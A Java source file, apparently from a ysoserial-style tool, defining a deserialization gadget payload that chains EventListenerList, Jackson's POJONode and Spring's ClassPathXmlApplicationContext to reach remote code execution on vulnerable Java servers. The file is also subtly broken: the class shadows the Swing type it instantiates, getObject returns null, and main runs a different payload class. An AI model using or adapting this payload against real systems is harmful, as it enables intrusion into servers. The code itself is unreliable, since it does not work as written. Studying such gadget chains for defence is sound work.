package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Gadgets;
import cn.butler.yso.payloads.util.Reflections;
import com.fasterxml.jackson.databind.node.POJONode;
import cn.butler.payloads.annotation.Authors;

import javax.swing.undo.UndoManager;
import java.util.Vector;

/**
 * org.jooq.joop-3.19.3 需要jdk高版本，所以暂时不做需要研究一下这种怎么搞
 * EventListenerList.readObject -> POJONode.toString -> ConvertedVal.getValue -> ClassPathXmlApplicationContext.<init>
 *     xz.aliyun.com/t/14190
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
//@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.B0T1ER })
public class EventListenerList implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        Object convertedVal = Gadgets.createGetter(command);
        POJONode pojoNode = new POJONode(convertedVal);

        EventListenerList eventListenerList = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Vector vector = (Vector) Reflections.getFieldValue(undoManager, "edits");
        vector.add(pojoNode);
        Reflections.setFieldValue(eventListenerList, "listenerList", new Object[]{InternalError.class, undoManager});
        return null;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1.class, args);
    }
}
